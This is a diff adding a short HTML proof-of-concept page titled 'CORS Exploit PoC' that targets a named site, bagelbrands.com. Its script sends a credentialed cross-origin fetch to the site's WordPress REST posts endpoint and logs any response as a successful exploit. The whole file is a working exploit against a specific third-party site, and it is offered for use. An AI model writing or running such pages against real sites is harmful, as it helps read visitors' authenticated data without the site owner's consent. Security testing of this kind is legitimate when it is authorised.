@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS Exploit PoC</title>
+</head>
+<body>
+  <h1>CORS Exploit - bagelbrands.com</h1>
+  <p>Open your browser console to see the result.</p>
+
+  <script>
+    fetch("https://bagelbrands.com/wp-json/wp/v2/posts", {
+      method: "GET",
+      credentials: "include"
+    })
+    .then(response => {
+      if (!response.ok) throw new Error("Request failed with status " + response.status);
+      return response.text(); // or .json() if you expect JSON
+    })
+    .then(data => {
+      console.log("[+] CORS Exploit Successful. Response:");
+      console.log(data);
+    })
+    .catch(error => {
+      console.error("[-] Exploit failed:", error.message);
+    });
+  </script>
+</body>
+</html>
